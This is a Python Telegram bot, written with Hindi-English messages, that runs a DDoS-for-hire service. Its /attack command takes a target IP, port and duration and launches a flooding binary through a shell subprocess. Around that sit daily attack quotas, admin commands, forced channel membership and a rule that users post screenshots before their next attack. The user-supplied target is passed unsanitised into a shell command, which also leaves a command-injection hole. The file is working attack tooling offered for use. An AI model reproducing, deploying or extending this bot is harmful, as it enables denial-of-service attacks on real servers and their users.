#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import random
import aiohttp
import threading
import random

# Insert your Telegram bot token here
bot = telebot.TeleBot('Bot Token')

# Admin user IDs
admin_id = ["1866961136 ,1807014348"]

# Group and channel details
GROUP_ID = "-1002328886935"
CHANNEL_USERNAME = "@DDOS_SERVER69"

# Default cooldown and attack limits
COOLDOWN_TIME = 0  # Cooldown in seconds
ATTACK_LIMIT =  5  # Max attacks per day
global_pending_attack = None
global_last_attack_time = None
pending_feedback = {}  # User feedback tracker

# Global attack status
global_attack_running = False
attack_lock = threading.Lock()  # Thread lock for global attack status

# Files to store user data
USER_FILE = "users.txt"

# Dictionary to store user states
user_data = {}
global_last_attack_time = None  # Global cooldown tracker 

# Files to store user data
USER_FILE = "users.txt"

# Dictionary to store user states
user_data = {}
global_last_attack_time = None  # Global cooldown tracker

# 🎯 Random Image URLs  
image_urls = [
    "https://envs.sh/g7a.jpg",
    "https://envs.sh/g7O.jpg",
    "https://envs.sh/g7_.jpg",
    "https://envs.sh/gHR.jpg",
    "https://envs.sh/gH4.jpg",
    "https://envs.sh/gHU.jpg",
    "https://envs.sh/gHl.jpg",
    "https://envs.sh/gH1.jpg",
    "https://envs.sh/gHk.jpg",
    "https://envs.sh/68x.jpg",
    "https://envs.sh/67E.jpg",
    "https://envs.sh/67Q.jpg",
    "https://envs.sh/686.jpg",
    "https://envs.sh/68V.jpg",
    "https://envs.sh/68-.jpg",
    "https://envs.sh/Vwn.jpg",
    "https://envs.sh/Vwe.jpg",
    "https://envs.sh/VwZ.jpg",
    "https://envs.sh/VwG.jpg",
    "https://envs.sh/VwK.jpg",
    "https://envs.sh/VwA.jpg",
    "https://envs.sh/Vw_.jpg",
    "https://envs.sh/Vwc.jpg"
]

def is_user_in_channel(user_id):
    return True  # **यहीं पर Telegram API से चेक कर सकते हो**

def is_user_in_channel(user_id):
    return True  # **Replace with actual Telegram API check**

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                user_id, attacks, last_reset = line.strip().split(',')
                user_data[user_id] = {
                    'attacks': int(attacks),
                    'last_reset': datetime.datetime.fromisoformat(last_reset),
                    'last_attack': None
                }
    except FileNotFoundError:
        pass

def save_users():
    with open(USER_FILE, "w") as file:
        for user_id, data in user_data.items():
            file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()}\n")



# Rest of the code remains the same...

# Function to load user data from the file
def load_users():
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                user_id, attacks, last_reset = line.strip().split(',')
                user_data[user_id] = {
                    'attacks': int(attacks),
                    'last_reset': datetime.datetime.fromisoformat(last_reset),
                    'last_attack': None
                }
    except FileNotFoundError:
        pass

# Function to save user data to the file
def save_users():
    with open(USER_FILE, "w") as file:
        for user_id, data in user_data.items():
            file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()}\n")

# Middleware to ensure users are joined to the channel
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global global_attack_running

    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    command = message.text.split()

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, f"🚫 **𝘽𝙃𝘼𝙄, 𝙔𝙀 𝘽𝙊𝙏 𝙎𝙄𝙍𝙁 𝙂𝙍𝙊𝙐𝙋 𝙈𝙀 𝘾𝙃𝘼𝙇𝙀𝙂𝘼!** ❌\n🔗 **𝙅𝙤𝙞𝙣 𝙉𝙤𝙬:** {CHANNEL_USERNAME}")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❗ **𝘽𝙃𝘼𝙄, 𝙋𝘼𝙃𝙇𝙀 𝙅𝙊𝙄𝙉 𝙆𝙍𝙊!** 🔥\n🔗 **𝙅𝙤𝙞𝙣 𝙃𝙚𝙧𝙚:** {CHANNEL_USERNAME}")
        return

    if pending_feedback.get(user_id, False):
        bot.reply_to(message, "😡 **𝘽𝙃𝘼𝙄, 𝙎𝘾𝙍𝙀𝙀𝙉𝙎𝙃𝙊𝙏 𝘿𝙀 𝙋𝘼𝙃𝙇𝙀!** 🔥\n🚀 **𝘼𝙂𝙇𝘼 𝘼𝙏𝙏𝘼𝘾𝙆 𝙇𝙂𝘼𝙉𝙀 𝙆𝙀 𝙇𝙄𝙀 𝙎𝘼𝘽𝙄𝙏 𝙆𝙍𝙊 𝙆𝙄 𝙋𝙄𝘾 𝘿𝘼𝙇𝙄!**")
        return

    # Check if an attack is already running globally
    with attack_lock:
        if global_attack_running:
            bot.reply_to(message, "⚠️ **𝘽𝙃𝘼𝙄, 𝙀𝙆 𝘼𝙏𝙏𝘼𝘾𝙆 𝙋𝙀𝙃𝙇𝙀 𝙎𝙀 𝘾𝙃𝘼𝙇 𝙍𝘼𝙃𝘼 𝙃𝘼𝙄!** ⚡")
            return
        else:
            global_attack_running = True  # Set global attack status to running

    if user_id not in user_data:
        user_data[user_id] = {'attacks': 0, 'last_reset': datetime.datetime.now(), 'last_attack': None}

    user = user_data[user_id]
    if user['attacks'] >= ATTACK_LIMIT:
        bot.reply_to(message, f"❌ **𝘽𝙃𝘼𝙄, 𝘼𝙏𝙏𝘼𝘾𝙆 𝙇𝙄𝙈𝙄𝙏 𝙊𝙑𝙀𝙍!** ❌\n🔄 **𝙏𝙍𝙔 �𝙂𝘼𝙄𝙉 𝙏𝙊𝙈𝙊𝙍𝙍𝙊𝙒!**")
        with attack_lock:
            global_attack_running = False  # Reset global attack status
        return

    if len(command) != 4:
        bot.reply_to(message, "⚠️ **𝘽𝙃𝘼𝙄, 𝙐𝙎𝘼𝙂𝙀:** /attack `<IP>` `<PORT>` `<TIME>`")
        with attack_lock:
            global_attack_running = False  # Reset global attack status
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ **𝘽𝙃𝘼𝙄, 𝙋𝙊𝙍𝙏 𝘼𝙉𝘿 𝙏𝙄𝙈𝙀 𝙈𝙐𝙎𝙏 𝘽𝙀 𝙄𝙉𝙏𝙀𝙂𝙀𝙍𝙎!**")
        with attack_lock:
            global_attack_running = False  # Reset global attack status
        return

    if time_duration > 120:
        bot.reply_to(message, "🚫 **𝘽𝙃𝘼𝙄, 𝙈𝘼𝙓 𝘿𝙐𝙍𝘼𝙏𝙄𝙊𝙉 = 120𝙨!**")
        with attack_lock:
            global_attack_running = False  # Reset global attack status
        return

    # Get the user's profile picture
    profile_photos = bot.get_user_profile_photos(user_id)
    if profile_photos.total_count > 0:
        profile_pic = profile_photos.photos[0][-1].file_id
    else:
        bot.reply_to(message, "❌ **𝘽𝙃𝘼𝙄, 𝙋𝙇𝙀𝘼𝙎𝙀 𝙎𝙀𝙏 𝘼 𝙋𝙍𝙊𝙁𝙄𝙇𝙀 �𝙄𝘾𝙏𝙐𝙍𝙀 𝙏𝙊 𝘼𝙏𝙏𝘼𝘾𝙆!**")
        with attack_lock:
            global_attack_running = False  # Reset global attack status
        return

    remaining_attacks = ATTACK_LIMIT - user['attacks'] - 1
    random_image = random.choice(image_urls)

    # Send profile picture and attack start message together
    bot.send_photo(message.chat.id, profile_pic, caption=f"👤 **𝙐𝙨𝙚𝙧:** @{user_name} 🚀\n"
                                                        f"💥 **𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏𝙀𝘿!** 💥\n"
                                                        f"🎯 **𝙏𝘼𝙍𝙂𝙀𝙏:** `{target} : {port}`\n"
                                                        f"⏳ **𝘿𝙐𝙍𝘼𝙏𝙄𝙊𝙉:** {time_duration}𝙨\n"
                                                        f"⚡ **𝙍𝙀𝙈𝘼𝙄𝙉𝙄𝙉𝙂 𝘼𝙏𝙏𝘼𝘾𝙆𝙎:** {remaining_attacks}\n"
                                                        f"📸 **𝙂𝘼𝙈𝙀 𝙎𝘾𝙍𝙀𝙀𝙉𝙎𝙃𝙊𝙏 𝘿𝙀!**\n"
                                                        f"⏳ **𝙋𝙍𝙊𝙂𝙍𝙀𝙎𝙎: 0%**")

    pending_feedback[user_id] = True  

    full_command = f"./Rohan  {target} {port} {time_duration} 512 1200"

    try:
        subprocess.run(full_command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f"❌ **𝘽𝙃𝘼𝙄, 𝙀𝙍𝙍𝙊𝙍:** {e}")
        pending_feedback[user_id] = False
        with attack_lock:
            global_attack_running = False  # Reset global attack status
        return

    # Update progress bar to 100% and close pop-up
    bot.send_message(message.chat.id, 
                     f"✅ **𝘼𝙏𝙏𝘼𝘾𝙆 𝘾𝙊𝙈𝙋𝙇𝙀𝙏𝙀!** ✅\n"
                     f"🎯 `{target}:{port}` **𝘿𝙀𝙎𝙏𝙍𝙊𝙔𝙀𝘿!**\n"
                     f"⏳ **𝘿𝙐𝙍𝘼𝙏𝙄𝙊𝙉:** {time_duration}𝙨\n"
                     f"⚡ **𝙍𝙀𝙈𝘼𝙄𝙉𝙄𝙉𝙂 �𝙏𝙏𝘼𝘾𝙆𝙎:** {remaining_attacks}\n"
                     f"⏳ **𝙋𝙍𝙊𝙂𝙍𝙀𝙎𝙎: 100%**")

    with attack_lock:
        global_attack_running = False  # Reset global attack status

def is_attack_running(user_id):
    """
    Checks if the user is currently running an attack.
    """
    return user_id in pending_feedback and pending_feedback[user_id] == True

def send_attack_finished(message, user_name, target, port, time_duration, remaining_attacks):
    bot.send_message(message.chat.id, "🚀 **𝘽𝙃𝘼𝙄, 𝙉𝙀𝙓𝙏 𝘼𝙏𝙏𝘼𝘾𝙆 𝙍𝙀𝘼𝘿𝙔!** ⚡")

@bot.message_handler(commands=['check_cooldown'])
def check_cooldown(message):
    if global_last_attack_time and (datetime.datetime.now() - global_last_attack_time).seconds < COOLDOWN_TIME:
        remaining_time = COOLDOWN_TIME - (datetime.datetime.now() - global_last_attack_time).seconds
        bot.reply_to(message, f"**𝘽𝙃𝘼𝙄, 𝙂𝙇𝙊𝘽𝘼𝙇 𝘾𝙊𝙊𝙇𝘿𝙊𝙒𝙉:** {remaining_time} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙧𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜.")
    else:
        bot.reply_to(message, "**𝘽𝙃𝘼𝙄, 𝙉𝙊 𝙂𝙇𝙊𝘽𝘼𝙇 𝘾𝙊𝙊𝙇𝘿𝙊𝙒𝙉. 𝙔𝙊𝙐 𝘾𝘼𝙉 𝙄𝙉𝙄𝙏𝙄𝘼𝙏𝙀 𝘼𝙉 𝘼𝙏𝙏𝘼𝘾𝙆.**")

# Command to check remaining attacks for a user
@bot.message_handler(commands=['check_remaining_attack'])
def check_remaining_attack(message):
    user_id = str(message.from_user.id)
    if user_id not in user_data:
        bot.reply_to(message, f"**𝘽𝙃𝘼𝙄, 𝙔𝙊𝙐 𝙃𝘼𝙑𝙀 {ATTACK_LIMIT} 𝘼𝙏𝙏𝘼𝘾𝙆𝙎 𝙍𝙀𝙈𝘼𝙄𝙉𝙄𝙉𝙂 𝙁𝙊𝙍 𝙏𝙊𝘿𝘼𝙔.**")
    else:
        remaining_attacks = ATTACK_LIMIT - user_data[user_id]['attacks']
        bot.reply_to(message, f"**𝘽𝙃𝘼𝙄, 𝙔𝙊𝙐 𝙃𝘼𝙑𝙀 {remaining_attacks} 𝘼𝙏𝙏𝘼𝘾𝙆𝙎 𝙍𝙀𝙈𝘼𝙄𝙉𝙄𝙉𝙂 𝙁𝙊𝙍 𝙏𝙊𝘿𝘼𝙔.**")

# Admin commands
@bot.message_handler(commands=['reset'])
def reset_user(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "**𝘽𝙃𝘼𝙄, 𝙊𝙉𝙇𝙔 𝘼𝘿𝙈𝙄𝙉𝙎 𝘾𝘼𝙉 𝙐𝙎𝙀 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿.**")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "**𝘽𝙃𝘼𝙄, 𝙐𝙎𝘼𝙂𝙀:** /reset <user_id>")
        return

    user_id = command[1]
    if user_id in user_data:
        user_data[user_id]['attacks'] = 0
        save_users()
        bot.reply_to(message, f"**𝘽𝙃𝘼𝙄, 𝘼𝙏𝙏𝘼𝘾𝙆 𝙇𝙄𝙈𝙄𝙏 �𝙊𝙍 �𝙎𝙀𝙍 {user_id} 𝙃𝘼𝙎 𝘽𝙀𝙀𝙉 𝙍𝙀𝙎𝙀𝙏.**")
    else:
        bot.reply_to(message, f"**𝘽𝙃𝘼𝙄, 𝙉𝙊 𝘿𝘼𝙏𝘼 𝙁𝙊𝙐𝙉𝘿 𝙁𝙊𝙍 𝙐𝙎𝙀𝙍 {user_id}.**")

@bot.message_handler(commands=['setcooldown'])
def set_cooldown(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "**𝘽𝙃𝘼𝙄, 𝙊𝙉𝙇𝙔 𝘼𝘿𝙈𝙄𝙉𝙎 𝘾𝘼𝙉 𝙐𝙎𝙀 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿.**")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "**𝘽𝙃𝘼𝙄, 𝙐𝙎𝘼𝙂𝙀:** /setcooldown <seconds>")
        return

    global COOLDOWN_TIME
    try:
        COOLDOWN_TIME = int(command[1])
        bot.reply_to(message, f"**𝘽𝙃𝘼𝙄, 𝘾𝙊𝙊𝙇𝘿𝙊𝙒𝙉 𝙏𝙄𝙈𝙀 𝙃𝘼𝙎 𝘽𝙀𝙀𝙉 𝙎𝙀𝙏 𝙏𝙊 {COOLDOWN_TIME} 𝙎𝙀𝘾𝙊𝙉𝘿𝙎.**")
    except ValueError:
        bot.reply_to(message, "**𝘽𝙃𝘼𝙄, 𝙋𝙇𝙀𝘼𝙎𝙀 𝙋𝙍𝙊𝙑𝙄𝘿𝙀 𝘼 𝙑𝘼𝙇𝙄𝘿 𝙉𝙐𝙈𝘽𝙀𝙍 𝙊𝙁 𝙎𝙀𝘾𝙊𝙉𝘿𝙎.**")

@bot.message_handler(commands=['viewusers'])
def view_users(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "**𝘽𝙃𝘼𝙄, 𝙊𝙉𝙇𝙔 𝘼𝘿𝙈𝙄𝙉𝙎 𝘾𝘼𝙉 𝙐𝙎𝙀 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿.**")
        return

    user_list = "\n".join([f"**𝙐𝙎𝙀𝙍 𝙄𝘿:** {user_id}, **𝘼𝙏𝙏𝘼𝘾𝙆𝙎 𝙐𝙎𝙀𝘿:** {data['attacks']}, **𝙍𝙀𝙈𝘼𝙄𝙉𝙄𝙉𝙂:** {ATTACK_LIMIT - data['attacks']}" 
                           for user_id, data in user_data.items()])
    bot.reply_to(message, f"**𝘽𝙃𝘼𝙄, 𝙐𝙎𝙀𝙍 𝙎𝙐𝙈𝙈𝘼𝙍𝙔:**\n\n{user_list}")

# Dictionary to store feedback counts per user
feedback_count_dict = {}

@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    feedback_count = feedback_count_dict.get(user_id, 0) + 1  # Increment feedback count for the user

    # Update feedback count in the dictionary
    feedback_count_dict[user_id] = feedback_count

    # 🚀 Check if user is in channel  
    try:
        user_status = bot.get_chat_member(CHANNEL_USERNAME, user_id).status
        if user_status not in ['member', 'administrator', 'creator']:
            bot.reply_to(message, f"❌ **𝘽𝙃𝘼𝙄, 𝙔𝙊𝙐 𝙈𝙐𝙎𝙏 �𝙊𝙄𝙉 𝙊𝙐𝙍 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝙁𝙄𝙍𝙎𝙏!**\n"
                                  f"🔗 **𝙅𝙤𝙞𝙣 𝙃𝙚𝙧𝙚:** [Click Here](https://t.me/{CHANNEL_USERNAME})")
            return  
    except Exception as e:
        bot.reply_to(message, "❌ **𝘽𝙃𝘼𝙄, 𝘾𝙊𝙐𝙇𝘿 𝙉𝙊𝙏 𝙑𝙀𝙍𝙄𝙁𝙔! 𝙈𝘼𝙆𝙀 𝙎𝙐𝙍𝙀 𝙏𝙃𝙀 𝘽𝙊𝙏 𝙄𝙎 𝘼𝘿𝙈𝙄𝙉 𝙄𝙉 𝘾𝙃𝘼𝙉𝙉𝙀𝙇.**")
        return  

    # ✅ Proceed If User is in Channel
    if pending_feedback.get(user_id, False):
        pending_feedback[user_id] = False  

        # 🚀 Forward Screenshot to Channel  
        bot.forward_message(CHANNEL_USERNAME, message.chat.id, message.message_id)

        # 🔥 Send Confirmation with SS Number  
        bot.send_message(CHANNEL_USERNAME, 
                         f"📸 **𝘽𝙃𝘼𝙄, 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆 𝙍𝙀𝘾𝙀𝙄𝙑𝙀𝘿!**\n"
                         f"👤 **𝙐𝙎𝙀𝙍:** `{user_name}`\n"
                         f"🆔 **𝙄𝘿:** `{user_id}`\n"
                         f"🔢 **𝙎𝙎 𝙉𝙤.:** `{feedback_count}`")

        bot.reply_to(message, "✅ **𝘽𝙃𝘼𝙄, 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆 𝘼𝘾𝘾𝙀𝙋𝙏𝙀𝘿! 𝙉𝙀𝙓𝙏 𝘼𝙏𝙏𝘼𝘾𝙆 𝙍𝙀𝘼𝘿𝙔!** 🚀")
    else:
        bot.reply_to(message, "❌ **𝘽𝙃𝘼𝙄, 𝙏𝙃𝙄𝙎 𝙄𝙎 𝙉𝙊𝙏 𝘼 𝙑𝘼𝙇𝙄𝘿 𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀!**")

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"""🌟🔥 **𝘽𝙃𝘼𝙄, 𝙒𝙀𝙇𝘾𝙊𝙈𝙀!** 🔥🌟

🚀 **𝙔𝙊𝙐'𝙍𝙀 𝙄𝙉 𝙏𝙃𝙀 𝙃𝙊𝙈𝙀 𝙊𝙁 𝙋𝙊𝙒𝙀𝙍!**  
💥 **𝙏𝙃𝙀 𝙒𝙊𝙍𝙇𝘿'𝙎 𝘽𝙀𝙎𝙏 𝘿𝘿𝙊𝙎 𝘽𝙊𝙏!** 🔥  
⚡ **𝘽𝙀 𝙏𝙃𝙀 𝙆𝙄𝙉𝙂, 𝘿𝙊𝙈𝙄𝙉𝘼𝙏𝙀 𝙏𝙃𝙀 𝙒𝙀𝘽!**  

🔗 **𝙏𝙊 𝙐𝙎𝙀 𝙏𝙃𝙄𝙎 𝘽𝙊𝙏, 𝙅𝙊𝙄𝙉 𝙉𝙊𝙒:**  
👉 [𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈 𝙂𝙍𝙊𝙐𝙋](https://t.me/DDOS_SERVER69) 🚀🔥"""

    bot.reply_to(message, response, parse_mode="Markdown")

# Function to reset daily limits automatically
def auto_reset():
    while True:
        now = datetime.datetime.now()
        seconds_until_midnight = ((24 - now.hour - 1) * 3600) + ((60 - now.minute - 1) * 60) + (60 - now.second)
        time.sleep(seconds_until_midnight)
        for user_id in user_data:
            user_data[user_id]['attacks'] = 0
            user_data[user_id]['last_reset'] = datetime.datetime.now()
        save_users()

# Start auto-reset in a separate thread
reset_thread = threading.Thread(target=auto_reset, daemon=True)
reset_thread.start()

# Load user data on startup
load_users()

#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        # Add a small delay to avoid rapid looping in case of persistent errors
        time.sleep(15)
        
        
        
        



